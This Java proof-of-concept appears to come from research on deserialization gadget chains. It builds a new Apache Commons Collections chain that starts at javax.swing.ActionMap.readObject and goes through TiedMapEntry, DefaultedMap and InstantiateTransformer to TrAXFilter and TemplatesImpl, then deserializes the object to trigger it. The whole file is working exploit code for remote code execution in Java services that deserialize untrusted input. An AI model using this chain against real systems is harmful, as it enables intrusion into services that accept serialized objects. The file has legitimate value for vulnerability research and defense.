package com.example.CC3;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;

import javax.swing.*;
import javax.swing.text.DefaultEditorKit;
import javax.xml.transform.Templates;

public class POC_9 {

    /*** run with actionMap_hashCode.jar
     * <javax.swing.ActionMap: void readObject(java.io.ObjectInputStream)>
     * <javax.swing.ActionMap: void put(java.lang.Object,javax.swing.Action)>
     * <javax.swing.ArrayTable: void put(java.lang.Object,java.lang.Object)>
     * <javax.swing.ArrayTable: void grow()>
     * <java.util.Hashtable: void put(java.lang.Object,java.lang.Object)>
     * <org.apache.commons.collections.keyvalue.TiedMapEntry: int hashCode()>
     * <org.apache.commons.collections.keyvalue.TiedMapEntry: java.lang.Object getValue()>
     * <org.apache.commons.collections.map.DefaultedMap: java.lang.Object get(java.lang.Object)>
     * <org.apache.commons.collections.functors.InstantiateTransformer: java.lang.Object transform(java.lang.Object)>
     * <com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter: void init(javax.xml.transform.Templates)>
     * <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl: javax.xml.transform.Transformer newTransformer(javax.xml.transform.Templates)>
     * <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl: com.sun.org.apache.xalan.internal.xsltc.Translet getTransletInstance(javax.xml.transform.Templates)>
     * <java.lang.reflect.Constructor: java.lang.Object newInstance(java.lang.Object[])>
     */

    public static void main(String[] args) throws Exception {
        Templates templates = Share.getTemplatesImplObj();
        InstantiateTransformer transformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
        DefaultedMap d = new DefaultedMap("1");
        TiedMapEntry t = new TiedMapEntry(d, TrAXFilter.class);

        ActionMap map = new ActionMap();
        DefaultEditorKit.BeepAction action = new DefaultEditorKit.BeepAction();
        Class atClass = Class.forName("javax.swing.ArrayTable");
        Object arrayTable = ReflectionUtil.createWithoutConstructor(atClass);
        Object[] table = new Object[16];
        for (int i = 0; i < 16; i += 2) {
            table[i] = i == 14 ? t : "key" + i;
            table[i + 1] = action;
        }

        ReflectionUtil.setField(arrayTable, "table", table);
        ReflectionUtil.setField(map, "arrayTable", arrayTable);
        ReflectionUtil.setField(d, "value", transformer);
        SerializeUtil.deserialize(SerializeUtil.serialize(map));
    }

}
